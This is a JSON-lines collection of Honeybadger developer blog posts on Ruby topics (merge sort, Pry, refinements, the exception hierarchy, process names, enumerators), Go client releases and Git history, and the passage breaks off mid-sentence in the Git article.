{"website": "Honey-Badger", "title": "Exploring Merge Sort with Ruby", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/ruby-merge-sort/", "abstract": "This is part 3 in a series looking at implementing various sorting algorithms with Ruby. Part 1 explored bubble sort , and part 2 explored selection sort . As we've discussed in the previous posts in this series, understanding how to sort data is an integral part of any software engineer's toolkit. Luckily, most higher-level languages, like Ruby, already have built-in methods that are efficient in sorting arrays. For instance, when you call .sort on an array, you are using quicksort under the hood. In this post, we're going to learn a similar algorithm to quick sort -- merge sort. Both of these algorithms utilize a \"divide and conquer approach.\" Merge sort was invented by John von Neumann in 1945. Von Neumann was a famous computer scientist and physicist who is also known for working on the Manhattan Project, the \"mini-max\" theorem, the Monte Carlo method, and more. At a high level, the merge sort algorithm splits the array into two sub-arrays again and again (utilizing recursion) until only one element remains. From there, the elements are \"merged\" back together to form the final, sorted array. Unlike bubble sort and other similar algorithms, merge sort is difficult to understand without visualization. The following diagram is a step-by-step illustration from Wikipedia showing how merge sort works. However, don't worry if you're still a bit fuzzy about what's going on; we will work through the code next. Unlike the algorithms we've previously discussed (i.e., bubble and selection), which were basically impractical for any real task, merge sort performs much better in terms of Big-O notation. If you're unfamiliar with Big-O notation, it represents the worst-case performance of different algorithms. This allows us to easily compare algorithms based on their Big-O. For example, an algorithm with a Big-O of O(1) means that the worst-case run-time is constant as the number of elements, \"n\", grows, whereas an algorithm with a Big-O notation of O(n) means that the worst-case run-time increases linearly as n grows. This means that if you have an array with 100 elements and must choose between sorting algorithms that are O(n) and O(1), you would choose the O(1) algorithm because O(1) definitely beats O(100). The bubble and selection sort algorithms both have a worst-case of O(n^2). This is not very useful because it means the algorithm will perform extremely slowly as the number of elements increases. In contrast, merge sort performs at n log(n), which means the algorithm will not sacrifice as much efficiency as bubble or selection sort. Let's walk through the example in the diagram. We start with an array of [38, 27, 43, 3, 9, 82, 10] and then split the array in half until we're left with single elements. We split the starting array into two halves: [38, 27, 43, 3] and [9, 82, 10] . We split the first half again: [38, 27] and [43, 3] . We split the first half into single elements: [38] , [27] , [43] , and [3] . We sort the 38 and 27 to make [27, 38] and the 48 and 3 to make [3, 43] . Putting these together, we have [3, 27, 38, 43] . Now, we move to the second half of the original array, which was [9, 82, 10] . We split it in half and get [9, 82] and [10] . We split [9, 82] into [9] and [82] , and then we have [10] , which is already singular. We sort the [9, 82] back together and then merge the [10] back in, resulting in [9, 10, 82] . Finally, we merge [3, 27, 38, 43] and [9, 10, 82] to get [3, 9, 10, 27, 38, 43, 82] . A Ruby Implementation The following is a merge sort algorithm written in Ruby: class MergeSort def sort ( numbers ) num_elements = numbers . length if num_elements <= 1 return numbers end half_of_elements = ( num_elements / 2 ). round left = numbers . take ( half_of_elements ) right = numbers . drop ( half_of_elements ) sorted_left = sort ( left ) sorted_right = sort ( right ) merge ( sorted_left , sorted_right ) end def merge ( left_array , right_array ) if right_array . empty? return left_array end if left_array . empty? return right_array end smallest_number = if left_array . first <= right_array . first left_array . shift else right_array . shift end recursive = merge ( left_array , right_array ) [ smallest_number ]. concat ( recursive ) end end Let's walk through what's happening here. First, we'll focus on the sort method at the top. def sort ( numbers ) num_elements = numbers . length if num_elements <= 1 return numbers end half_of_elements = ( num_elements / 2 ). round left = numbers . take ( half_of_elements ) right = numbers . drop ( half_of_elements ) sorted_left = sort ( left ) sorted_right = sort ( right ) merge ( sorted_left , sorted_right ) end The goal of this portion of the code is to split the given numbers in half until we're left with only one item in each. To see it in action, comment out the last line (merge(sorted_left, sorted_right)) and, instead, print out sorted_left and sorted_right . Running the program by passing in our example array, you should see this in your terminal: merge_sort = MergeSort . new puts merge_sort . sort ([ 38 , 27 , 43 , 3 , 9 , 82 , 10 ]) ruby ruby-merge-sort.rb 27 43 38 3 9 82 10 Great! Our code has taken our initial array and split it in half. Let's take a look at the merge portion of the code next. def merge ( left_array , right_array ) if right_array . empty? return left_array end if left_array . empty? return right_array end smallest_number = if left_array . first <= right_array . first left_array . shift else right_array . shift end recursive = merge ( left_array , right_array ) [ smallest_number ]. concat ( recursive ) end First, we check whether either of the sub-arrays is empty. If so, we can simply return the other one. Otherwise, given that both sub-arrays are not empty, we compare the value of each array's first element and then shift the compared values to prevent the creation of an infinite loop. Next, we utilize recursion (more on that in a second!) on the original array until we can finally connect the two arrays together, nicely sorted. A bit more on recursion If there is something that looks weird in our code, my guess is it's this line: recursive = merge(left_array, right_array) We're calling our merge method from within itself . Whoa! This is what we call recursion -- a technique in which a function calls itself one or more times until a specified condition is met. In our case, merge will continue to be called until the left or right array is empty. If you're interested in learning more about recursion, here is an example that walks through utilizing Ruby and recursion to write a function for a Fibonacci Sequence. Wrap-up I hope you enjoyed learning more about merge sort! Understanding how it works at a high level, as well as why it is a more efficient choice than bubble or selection sort will likely come in handy in job interviews or your day-to-day tasks. Also, there are a number of merge sort variants that you can read more about it on Wikipedia if you're interested. Until next time ... happy sorting!", "date": "2020-11-18"},
{"website": "Honey-Badger", "title": "Honeybadger for Go (golang) v0.0.3 released", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/honeybadger-golang-v0-0-3/", "abstract": "Last week we released some improvements to our Go client, which reports panics and errors from Go applications. Check out the package on GitHub , and read on to learn about the update! Development mode Adding a test/development mode is something we've been wanting to do since we first released Honeybadger for Go, and now it's possible by using the NewNullBackend() method. In the honeybadger package a backend is an interface which responds to the method Notify() : // The Backend interface is implemented by the server type by default, but a // custom implementation may be configured by the user. type Backend interface { Notify ( feature Feature , payload Payload ) error } The backend Honeybadger uses to report data can be configured using the honeybadger.Configure() method. Making the backend configurable allows the user to decide how the data should be handled after our package collects it; the default backend is the server backend , which sends the data to Honeybadger servers via HTTP . NewNullBackend() creates a backend which swallows all errors and does not send them to Honeybadger. This is useful for development and testing to disable sending unnecessary errors. To stop reporting live data, just configure the backend option to use the null backend: honeybadger . Configure ( honeybadger . Configuration { Backend : honeybadger . NewNullBackend ()}) Updated CI build Now that Go 1.6 is out , we updated our TravisCI build matrix to test 1.4-1.6 so that we can be sure that we support the latest versions of Go and do not create regressions. Bugfixes One of the packages we depend on, shirou/gopsutil released a breaking change to their API which forced us to update our usage. Be sure to update both honeybadger and gopsutil to the latest versions when you upgrade (and always vendor your dependencies!) We also fixed an issue with an unexported field name on the Fingerprint type, which was added in v0.0.2. Thanks to our contributors This release was made possible by our awesome customers. Thank you to Chris Gaffney , Stephen Meriwether and Kostiantyn Stepaniuk for your contributions. Let me know if you ever visit Portland, OR so that I can buy you a beer. :beers: :) For a full history of the changes we make to the honeybadger package for Go, check out the CHANGELOG . I hope that these improvements will help you exterminate errors and panics in your Go applications faster. If you haven't tried Honeybadger for Go yet, sign up for a free trial !", "date": "2016-04-25"},
{"website": "Honey-Badger", "title": "Introducing the new 2.x Honeybadger gem", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/introducing-the-new-2-x-honeybadger-gem/", "abstract": "After nearly six months of effort that nearly cost us the sanity of our beloved Joshua Wood, we are proud to officially announce the release of version 2.x of the Honeybadger gem . Upgrade instructions are here . If you're thinking to yourself, \"Wait a second, I saw that last month on github!?\" you're not mistaken. The release process for this gem has been so careful and gradual that it's been like watching water boil, or paint dry. And even after the gem was good and released, we held off of doing an official announcement until now. Perhaps we were waiting for the other shoe to fall. For something to go horribly wrong. But strangely, enough it never did. So what's new? All new, clean, modern code Version 1.x of our gem was based on the old MIT licensed Hoptoad gem. Version 2.x has been re-written from the ground up in modern Ruby. Non-blocking by default All data is now sent asynchronously. That means that when your users encounter an error, they don't have to wait an extra 250ms for your back end to report the error to us. Native Sinatra support Honeybadger now hooks into Sinatra to send errors automagically, just like it does with Rails. You no longer have to write any extra code to add exception handling to Sinatra. Native Rake support You can now automatically report errors from your non-rails Rake tasks. User info is added to errors automatically If you're running Warden, the authentication system that Devise and other gems are based on, we'll automatically pull in the id of the user who caused the exception. Not only can you fix the error, but you can email the affected users to say \"sorry.\" Request data everywhere Request params, cookies and session data are now sent with any exception that happens anywhere in your web app. In version 1.x they were only sent for exceptions that happened inside a controller. Smaller memory footprint We spent weeks instrumenting the new gem, counting object allocations and eliminating them whenever possible. As a result, the new gem is using about 25% less RAM in our tests. New YAML configuration with full ENV support baked in By making the configuration data-based instead of code-based we've made it much easier to support non-rails platforms such as Sinatra, Sidekiq, Rake tasks, etc. We've also simplified the list of configuration options, making them much easier to use. Better testing The new gem features a full integration test suite against all combinations of supported Ruby and framework versions. We've also made it easier to verify error reporting in your own tests. ...and much much more We've only hit the high points here. It'd probably bore you to death if I listed every single improvement we've made. Remember, if you'd like to upgrade, we have a how-to article here . Let us know if you have any problems at support@honeybadger.io", "date": "2015-03-24"},
{"website": "Honey-Badger", "title": "7 Reasons to Attend Rocky Mountain Ruby 2016 + A Giveaway", "author": ["Sophia Le"], "link": "https://www.honeybadger.io/blog/7-reasons-to-attend-rocky-mountain-ruby-2016/", "abstract": "Rocky Mountain Ruby is back for its seventh year...and we're sponsoring! Here are seven reasons you should attend. You could get a ticket for free . The schedule is jam-packed with speeches from development thought leaders of the Mountain West and beyond. The conference is on a Friday, meaning you can make a weekend trip out of it. You can snag a Honeybadger t-shirt. You can network with up to 250 people. The conference is in one of my favorite cities in the entire world: Denver, Colorado. Did I mention that you could get a ticket for free? Enter here for a chance to win a free conference pass. Airfare and hotel not included. Additional terms and conditions may apply. Giveaway ends on September 19th, 2016. Good luck!", "date": "2016-08-31"},
{"website": "Honey-Badger", "title": "Why Pry is one of the most important tools a junior Rubyist can learn", "author": ["Melissa Williams"], "link": "https://www.honeybadger.io/blog/debugging-ruby-with-pry/", "abstract": "Have you ever tried to debug your code by typing in puts statements and hoping they’d eventually show up where they should? You know what I mean - you type: puts “This worked!\" into the code and then run it in the terminal, only to have nothing show up. Or maybe you’ve heard of the fancy debugging tools available to Rubyists but have been afraid to try them. So instead you go for the spaghetti method of debugging: throw code at your text editor and see what sticks. Problem is, this method doesn’t guarantee a solution. Debugging is something you’re going to be doing for the rest of your coding life. It’s not just for junior devs! The sooner you learn the tools that help you find the bugs in your code, the better off you’ll be in the long run. So what are the tools out there? While there are many choices, today we’re going to pry into one of the great tools every Rubyist should know how to use - Pry. We’ll learn how it works and why it’s important. What is Pry? Pry freezes your program so you can get inside your code and find out what’s going on and what needs fixing. Pry can look confusing at first, but take it from a fellow junior Ruby Dev - it gets easier the more you use it, and soon you’ll never want to program without it. Pry is like IRB on steroids Chances are, you’ve grown comfortable using IRB (Interactive Ruby Shell) where you can take your code and run it in a playground to find out what works and what doesn’t.  It can also be a useful tool for debugging. Part of Pry works in a similar fashion, but with added features. Both IRB and Pry use REPL commands: Read, Evaluate, Print, and Loop. But Pry allows you to go further when debugging. For example, Pry gives you color-coded syntax, which helps when you’re trying to figure out what will happen when code is executed. It makes mistakes easier to spot, which makes your code easier to fix. Sample code A note about debugging It’s been said already, but it’s worth saying again - debugging is something that all programmers do throughout their careers. There’s nothing junior about learning these tools at all! So the sooner you learn them, the better a programmer you’ll be. Setting breakpoints with Pry Now it’s time to look at one of the very best features of Pry - setting breakpoints in your code. Let’s say you’re having a really hard time getting your code to run the way you expected. (We’ve all been there, right?) What you can do is set a breakpoint in the part of the code that isn’t working as expected and then you’ll end up in a version of Pry, but at a point that is frozen. The best way to explain this is with an example. Suppose we're trying to find out if the user we want to view is set properly. First, we can add our binding.pry into the code. Set the binding.pry right above the line of code that is causing the trouble and then run the code. Next, we try hitting the page that will trigger this code. Since we're running the rails server locally, we'll try going to: localhost:3000/users/1 You’ll find that you land in an IRB-like console where you can test out your code and see what’s happening. At this point, we're able to check whether '@user' is set to the right user id. We can also check whether our user is logged in: What if nothing happens? Sometimes you’ll place your breakpoints, run your code, and instead of landing inside Pry, nothing seems to happen. While this may be frustrating, it does give a clue. It means that your code never triggered the Pry because it never got that far. So what do you do? You set a new breakpoint earlier in the code and see if that works. While this may seem tedious, it is actually giving you important information! When to ask for help As a junior Rubyist, sometimes you'll need to ask a more senior developer for help. The problem is deciding when to keep debugging and when to call for help. When debugging, it's a good idea to try replicating the problem. Set your breakpoints with Pry and dig deeper into the code. If after 20-30 minutes you're no closer to finding a solution, it might be time to ask for assistance. Give Pry a try When you're ready to add Pry to your arsenal of debugging tools, you'll need to do a couple of things. First, you'll need to install the gem. You can do this by adding it to your gemfile and running a bundle install: gem 'pry' Or, you can manually install it: gem install pry You'll also need to make sure your code is expecting Pry, so place this line in your file: require 'pry' And that's it! You're up and running with Pry!", "date": "2020-03-03"},
{"website": "Honey-Badger", "title": "Understanding Ruby Refinements and Lexical Scope", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/understanding-ruby-refinements-and-lexical-scope/", "abstract": "If you never use refinements before, you're probably in for a surprise. You may have heard that refinements were introduced to replace monkey patching. So you might expect that you'd be able to implement something like ActiveSupport's hours method: module TimeExtension refine Fixnum do def hours self * 60 end end end class MyFramework using TimeExtension end class MyApp < MyFramework def index 1 . hours end end MyApp . new . index # undefined method `hours' for 1:Fixnum (NoMethodError) If you were to run the code above, you would find that it doesn't work.  So what gives? Like so many other great ideas, the original concept of refinements had to be tweaked in order to make it work with cold hard reality. The surprising behavior in the code that we looked at above is caused by one of these tweaks. Specifically, the rule that says that refinements are lexically scoped. What is lexical scoping? When we say that something is lexical, it means that has to do with text — the code on the screen as opposed to what that code means. If two lines are lexically scoped, it simply means that they occur within the same code block — regardless of what that code block may evaluate to. It's much easier to see an example than to talk about it: class B # x and y share the same lexical scope x = 1 y = 1 end class B # z has a different lexical scope from x and y, even though it's in the same class. z = 3 end Refinements are lexically scoped When we apply a refinement with the using keyword, the refinement is only visible within the lexical scope. Here's an example showing what I mean: module TimeExtension refine Fixnum do def hours self * 60 end end end class MyApp using TimeExtension def index 1 . hours end end class MyApp def show 2 . hours end end MyApp . new . show # undefined method `hour' for 1:Fixnum (NoMethodError) Even though both the index and show methods are part of the same class, only the index method has access to the refinement, because only it shares lexical scope with the using statement. This probably seems a little bit weird, because pretty much everything else in Ruby is dynamically scoped. When you add a method to a class, the method stays there when you exit the class definition. But that's not how refinements work. This is a number of consequences that may not be obvious at first. You can't dynamically invoke a refinement method Because the send method isn't defined within the same code block that contains your using statement, it can't see the refinement. So this doesn't work: class MyApp using TimeExtension def index 1 . send ( :hours ) end end You can't query the existence of a refinement method The respond_to? method isn't within the same code block either. So it doesn't work for the same reason the send method doesn't. class MyApp using TimeExtension def index 1 . respond_to? ( :hours ) end end Conclusion I hope this clears up some of the confusion that I've seen people have around refinements. They're definitely a potentially useful feature of Ruby, but if you've never used them before they can be a little bit tricky.", "date": "2015-10-19"},
{"website": "Honey-Badger", "title": "Rescue's Elegant Trick for Knowing Which Exceptions to Catch", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/ruby-rescue-elegant-trick-for-knowing-which-exceptions-to-catch/", "abstract": "If you've worked with Ruby's exceptions before, you know you can specify which exceptions get rescued and which are not: begin raise ArgumentError rescue ArgumentError # Rescues the `ArgumentError` end ...and you probably know that when you rescue a \"parent\" you rescue all of its \"children\" as well. begin raise ArgumentError rescue StandardError # Rescues `ArgumentError`, because it inherits from # `StandardError` end When I say \"parent\" and \"child\" I'm simply referring to class inheritance. Somewhere deep in the Ruby source code there is something equivalent to this: class ArgumentError < StandardError\n   ...\nend An interesting trick Here's my question: how does Ruby know if any given exception inherits from the class you specified? The most obvious approach would be to use the is_a? or kind_of? method. We could imagine it looking like this: if the_exception . is_a? ( StandardError ) # do the rescue end But that's not what happens. Instead, Ruby uses the more interesting === operator. if StandardError === the_exception # do the rescue end If you've never used a === b , it usually answers the question \"does a inherently belong to the group defined by b\"? Here are some examples: ( 1 .. 10 ) === 5 # true ( 'a' .. 'f' ) === \"z\" # false String === \"hello\" # true String === 1 # false /[0-9]{3}/ === \"hello123\" # true /[0-9]{3}/ === \"hello\" # false Because === is just an ordinary ruby method like == , we can define it ourself: class RedThings def self . === ( thing ) thing . color == :red end end So, what do we know? We know that rescue uses === to determine which exceptions get rescued. And we know that we can define our own === method. That means we can create a class that decides on-the-fly which exceptions are rescued: class SevereMatcher def self . === ( exception ) exception . message =~ /severe/ end end begin raise RuntimeError , \"Something severe happened\" rescue SevereMatcher # rescues all exceptions with the word \"severe\" in # the message, regardless of class. end Once you know this trick, the only limit is your imagination. Conclusion I'll admit: you may not ever need to create a dynamic exception matcher. But this is a really interesting example of how a seemingly-trivial implementation detail like using === instead of kind_of? makes Ruby much more flexible and interesting.", "date": "2017-01-10"},
{"website": "Honey-Badger", "title": "Building a Toy Programming Language in Ruby", "author": ["Alex Braha Stoll"], "link": "https://www.honeybadger.io/blog/stoffle-introduction/", "abstract": "Do you find programming languages marvelous yet mysterious tools? What if you were given the opportunity to peek under their hood and understand what makes them function? If you're interested in the prospect of getting your hands dirty and developing a programming language from scratch, then this blog post and the following posts in this series will be helpful. In a series of articles, we will build a very simple interpreted, dynamically typed programming language step-by-step. However, for now, don't worry if you're a bit uncertain about the exact meaning of these terms or are feeling a bit intimidated by the task at hand. We will be using the lovely Ruby programming language to implement the interpreter and explain each step clearly to ensure both novice and advanced developers can follow along. We're naming this language 'Stoffle' in tribute to a lovely South African honey badger that goes by this name. Why Build a Programming Language? Stoffle will probably not ever replace Python or Ruby. So, why bother developing it? In addition to being fun, what I hope to show in this series is that building a language is a great programming exercise. Multiple benefits can be gained from this experience: It demystifies programming languages (and developer tools, by proxy) and allows us to see ourselves not only as consumers of these tools but also as creators capable of devising our own if needs or desires dictate; This exercise will present some uncommon programming challenges that most of us never face in our daily lives; We will also learn about components that are useful outside the realm of programming language implementation . A parser can be used instead of a million cryptic regular expressions to deal with, for example, that problematic legacy text file your boss says must now be supported as a new mechanism for importing data into the system you work on. How Does a Programming Language Work? Before taking a look at what lies ahead of us in this project, let's first zoom out and understand how a program runs on a computer. As you might imagine, a CPU does not directly support a high-level language like Ruby. CPUs have, however, a series of very low-level instructions that they support depending on their architecture. If you're curious, research, for example, the x86 architecture, which very likely powers your computer if you're reading this article on a PC or Mac. So, the task of a programming language is to have its high-level code transformed into machine code that the CPU understands. A plethora of strategies are used to accomplish this task. Stoffle will be an interpreted language, which means the interpreter will translate Stoffle's source code into machine code while the program is running. Compiled languages, such as C, are a different beast. They have a compilation step that translates and produces binary (i.e., the source converted to machine code) ready to be executed by the target CPU. Another strategy is to compile a source file into another (often, high-level) language that already exists; this strategy is commonly referred to as 'transpilation.' Keep in mind, though, that things are not as clear cut when dealing with real-world languages. They commonly embrace, in one way or another, aspects and techniques of all these (and other) different implementation strategies. I encourage you to research more about what path your preferred language follows after we get the basics covered. A Bird's-eye View of Stoffle As mentioned previously, Stoffle will be an elementary, interpreted, dynamically typed programming language. It will consist of only a few basic data types, the four elementary arithmetic operators, comparison and equality, logical operators, if / else, while loop, functions, and the ability to print to the console. Trivia: Languages similar to Stoffle whose primary purpose is learning and experimentation are often called toy languages . Stoffle's interpreter will be implemented using our trusted and beloved Ruby, as mentioned previously. When we fire up our interpreter ( stoffle hello_world.sfe ), the components and phases our source file will go through before running are as follows: The parts of our interpreter and what happens when a .sfe file is run. Lexer Also known as a scanner, the lexer's mission is to convert a plain string of characters into sensible groupings generally called 'tokens.' Imagine we declare a variable called my_var. Our lexer will read these characters and produce a Token::VARIABLE token. Parser When we think of source code, its nested nature is undeniable. Consider a conditional expression, for example; its true and false branches are nested and executed depending on the result of the evaluation of the condition. The main job of the parser is to transform a flat sequence of tokens into a data structure that can represent relationships existing between them. Another important function of the parser is to tell us when we've messed up by reporting syntax errors. Interpreter Stoffle's interpreter will be simple and work directly with the data structure produced by the parser. The interpreter will analyze this structure piece-by-piece and execute it as it goes. In the Stoffle programming language, the conversion into machine code is going to happen because the interpreter itself is going to be a Ruby program (and therefore be interpreted by Ruby's interpreter as we run it!). Wrapping up In today's article, we presented a rough overview of the steps we'll take to bring Stoffle to life. I hope you're as excited as I am and that I was able to infuse confidence in those of you who initially thought implementing a programming language was something out of reach for mere mortals. In the next blog post in this series, we'll start getting our hands dirty by implementing Stoffle's lexer, which means that by the end of the next post, we'll have developed a Ruby program capable of reading Stoffle source code and transforming a bland sequence of characters into a more structured (and interesting!) sequence of tokens. See you soon in the next installment of this series!", "date": "2020-05-06"},
{"website": "Honey-Badger", "title": "Understanding the Ruby Exception Hierarchy", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/understanding-the-ruby-exception-hierarchy/", "abstract": "Exceptions are just classes in Ruby. The exception exception hierarchy is made up of all the classes that inherit from Exception. Here's a the exception hierarchy for Ruby 2.1's standard library. Exception NoMemoryError ScriptError LoadError NotImplementedError SyntaxError SecurityError SignalException Interrupt StandardError -- default for rescue ArgumentError UncaughtThrowError EncodingError FiberError IOError EOFError IndexError KeyError StopIteration LocalJumpError NameError NoMethodError RangeError FloatDomainError RegexpError RuntimeError -- default for raise SystemCallError Errno ::* ThreadError TypeError ZeroDivisionError SystemExit SystemStackError Practical uses The reason that exceptions are arranged into a class tree is so that you can easily rescue similar types of exception. For example, consider the code: begin do_something rescue StandardError => e end This will rescue not only StandardError, but also any exception that inherits from it. That happens to be pretty much any exception you'll be interested in. In your own code, you might have all of your custom exceptions inherit from a single base class: module MyLib class Error < StandardError end class TimeoutError < Error end class ConnectionError < Error end end ... begin do_something rescue MyLib :: Error => e # Rescues any of the exceptions defined above end", "date": "2015-06-03"},
{"website": "Honey-Badger", "title": "How to change the process name of your Ruby script as shown by `top` and `ps`", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-change-the-process-name-in-ruby-for-top-and-ps/", "abstract": "Whenever you run a program on linux or OSX, it runs inside of a process. And every process has a name. The name is what you see when you run a command like ps or top, or htop. htop shows the process names in the rightmost column. Default Process Names Can Suck By default a process's name is derived from the executable file name containing the program you're running. This works out nicely for most executables. After all, it makes sense that when you run \"less\", its process name should be \"less.\" But the default process names are less helpful when you have a Ruby script that you're running from the command line. In the example below, I'm running a ruby script that sleeps for five seconds. If I simultaneously run \"ps\" in another terminal window, I see that the process name for my sleeper is \"ruby sleep_5_seconds.rb\". If I were to add command line arguments, those would show up in the process name as well. This would make it difficult to refer to the process by name. The full ruby command is listed as the process name How to Change the Process Name Fortunately you can change the name of the current process easily with Ruby. Here's our updated script. It now sets its process name to \"sleeper.\" # `Process.setproctitle()` is in Ruby >= 2.1 # For earlier versions of Ruby, you can use #   $PROGRAM_NAME = \"sleeper\" # or #   $0 = \"sleeper\" Process . setproctitle ( \"sleeper\" ) sleep 5 Now, when we run the program and use ps to display its title, we get \"sleeper\" Changing the process title in Ruby changes the output of ps and top But even better, we can now easily refer to the process by name. Suppose I get tired of waiting for my sleeper to sleep. I can kill it using the command killall sleeper . You can use the killall command to terminate processes by name Displaying Server Status via Process Name One interesting use of our new ability to change process titles is to display status information for long running processes. If you've ever run Unicorn, this should look familiar: \\- + = 27185 deply unicorn master -c simple_unicorn_config.rb -l0 .0.0.0:8080\n   |--- 27210 deply unicorn worker[0] -c simple_unicorn_config.rb -l0 .0.0.0:8080\n   |--- 27211 deply unicorn worker[1] -c simple_unicorn_config.rb -l0 .0.0.0:8080\n   |--- 27212 deply unicorn worker[2] -c simple_unicorn_config.rb -l0 .0.0.0:8080\n   |--- 27213 deply unicorn worker[3] -c simple_unicorn_config.rb -l0 .0.0.0:8080 It's an instance of Unicorn with four child processes. Just as with our sleep_5_seconds.rb example, the process names just show the commands used to launch the processes. It might be useful for the status lines to display if the worker is busy or idle. Something like this: \\ -+= 27185 deply unicorn master - c simple_unicorn_config . rb - l0 . 0.0 . 0 : 8080 |--- 27210 deply unicorn worker [ 0 ] - c simple_unicorn_config . rb - l0 . 0.0 . 0 : 8080 BUSY |--- 27211 deply unicorn worker [ 1 ] - c simple_unicorn_config . rb - l0 . 0.0 . 0 : 8080 |--- 27212 deply unicorn worker [ 2 ] - c simple_unicorn_config . rb - l0 . 0.0 . 0 : 8080 |--- 27213 deply unicorn worker [ 3 ] - c simple_unicorn_config . rb - l0 . 0.0 . 0 : 8080 BUSY You could actually do this pretty easily with a Rack middleware. Here's an example of what that might look like: class UpdateProcessTitle def initialize ( app ) @app = app end def call ( env ) title = $0 $0 = $0 + \" BUSY\" status , headers , body = @app . call ( env ) $0 = title [ status , headers , body ] end end I have no idea of the performance implications of setting the process title on every web page request. So take this all with a grain of salt. But still, it's a pretty cool idea. If you'd like to see a more advanced implementation of this idea - one that's actually been used in production - check out Thomas Varaneckas' great blog post on Overriding Unicorn Worker Process Names .", "date": "2015-07-02"},
{"website": "Honey-Badger", "title": "How to add context data to exceptions in Ruby", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-add-context-data-to-exceptions-in-ruby/", "abstract": "Sometimes the standard backtrace / error message combo isn't enough. Sometimes you need extra data to locate the cause of an error. Fortunately, it's super easy to do in Ruby. Customizing the error message The simplest way to add contextual information to your errors is to add it to the exception's message. In the example below I'm catching an exception and re-raising it with a new message: begin raise \"foo\" rescue => e raise e . class , \"bar\" end # RuntimeError: bar A good use case for this approach might be when you're rendering a template. Any exception that happens inside the template doesn't know the template's filename. But that's pretty important information for you to know when debugging. Here's an example of how you could rescue template errors and prepend the file name to the message. filename = \"mytemplate.erb\" template = File . read ( filename ) # Contains \"<% 1/0 %>\" e = ERB . new ( template ) begin e . result rescue => e raise e . class , [ filename , e . message ]. join ( \": \" ) end # ZeroDivisionError: mytemplate.erb: divided by 0 Wrapping the exception Another option for including contextual information in exceptions is to create a custom exception. Since exceptions are just classes like everything else in Ruby, you can add as many attr_accessors as your heart desires. Here's how that might look: TemplateError < StandardError attr_reader :filename def initialize ( msg , filename ) @filename = filename super ( msg ) end end begin ERB . new ( template ). result rescue => e raise TemplateError . new ( e . message , filename ) end Using Honeybadger's context feature Ok, ok. I had to put this in, since Honeybadger has a pretty slick way to add contextual information to your exceptions. Instead of modifying the exception object, you simply use the Honeybadger.context method from anywhere in your application. class ApplicationController ... . def find_current_user user = ... Honeybadger . context ( user_id: user . id , user_email: user . email , user . scope : \"user\" ) end end When an exception happens, the context data is reported along with it. You can then view the data along with other exception data in our web or mobile apps. Honeybadger's context feature lets you attach whatever info you need to your exceptions without much code.", "date": "2015-07-23"},
{"website": "Honey-Badger", "title": "Creating Ruby enumerators on the fly", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/creating-ruby-enumerators-on-the-fly/", "abstract": "When you treat your collections as enumerators, you get to use all your favorite functions like #map and #reduce without having to write any extra code. It's pretty awesome. In the olden days, defining enumerators was a little cumbersome. You had to make a new class, include the Enumerable module, and define an #each function. Ever since Ruby 1.9, though, we have a much more lightweight way to define enumerators on the fly. Let's take a look. Introducing the Enumerator class The Enumerator class lets you define a one-off enumerator, by using a block syntax. In the example below, we create an enumerator that returns an infinite series of random numbers. e = Enumerator . new do | y | loop do y << rand ( 10 ) # The << operator \"yields\" a value. end end # Make the enumerator \"yield\" 10 values, then stop puts e . first ( 10 ). inspect # => [6, 6, 7, 2, 2, 9, 6, 8, 2, 1] You may have noticed that we're using the shift operator << in a strange way. This is a shortcut for the y.yield method. You will call it for each item in the enumerator. If this all seems a bit magical to you, don't worry. It is. Collection size Figuring out the size of a collection poses a problem for Ruby's lazy enumerators. To count the items in a collection, you have to load the entire collection - which is against the entire point of using lazy enumerators. There is a work-around, kind of. If you happen to know the size of the collection at the time you create the Enumerator, you can provide it. # You can pass the length as an argument to the constructor, if you have it e = Enumerator . new ( 10 ) do | y | 10 . times { y << rand } end My real-world example Just yesterday I was working on Honeybadger's new documentation site. It's built using Jekyll, and I was writing a plugin to create a table of contents based on the <h2> and <h3> tags in the documentation. It's kind of awkward to figure out which <h3> tags belong to a section defined by <h2> tags. You have to parse the HTML using nokogiri, and then scan the resulting document. So I abstracted that bit of code out and made it an Enumerator. Here's what it looks like. def subheadings ( el ) Enumerator . new do | y | next_el = el . next_sibling while next_el && next_el . name != \"h2\" if next_el . name == \"h3\" y << next_el end next_el = next_el . next_sibling end end end", "date": "2015-09-03"},
{"website": "Honey-Badger", "title": "How Does Git Work?", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/how-does-git-work/", "abstract": "If you're like me and have less than fifteen years of software engineering experience, the thought of a world without Git doesn't seem possible. When I started to research for this post, I almost fell out of my chair when I read that Git was created in 2005. It doesn't seem that long ago ... either that, or I'm simply getting old. :) Regardless, I often find myself being scared of certain Git commands. Do I rebase , or do I merge ? What is the use case for a force push ? There have definitely been a few occasions when a wrong Git command turned into a big deal . So, I decided to bite the bullet and learn what is going on under that magical hood. A brief history Git is a version control system that is distributed, which means that it uses multiple local repositories, including a centralized repo and server. Before distributed systems, subversion (SVN) was a popular way to manage code version control. Unlike Git, it is centralized rather than distributed. With SVN, your data is stored on a central server, and any time you check it out, you're checking out a single version of the repository. While most of us remember Git as the first distributed version control system, before Git, there was BitKeeper, a proprietary source control management system. Created in 1998, BitKeeper was spun up to solve some of the growing pains of Linux. It offered a free license for open-source projects, with the stipulation that developers could not create a competing tool while using BitKeeper plus one additional year. I'm sure you can guess what happened. In the early-to-mid 2000s, there were a plethora of license complaints, and in 2005, the free version of BitKeeper was removed. This prompted Linus Torvalds to create Git, which he named after a British slang word that means \"unpleasant person.\" Linus Torvalds turned the project over to Junio Hamano (a major contributor) after its original v0.99 release, and Junio remains the core maintainer of the project. Fun Fact: The most recent version of Git was released on July 27th, 2020, and is version 2.28. If you want to read more about BitKeeper, check out the Wikipedia page here -- it is no longer being developed. What is Git, really? While Git has morphed into a full-fledged version control management system, this wasn't the original intent. Linus Torvalds said the following on this topic: In many ways, you can just see Git as a filesystem -- it's content-addressable, and it has a notion of versioning, but I really designed it coming at the problem from the viewpoint of a filesystem person (hey, kernels is what I do), and I actually have zero interest in creating a traditional SCM (source control management) system. Side note: In case you're wondering what \"content-addressable\" means, it is a way to store information, 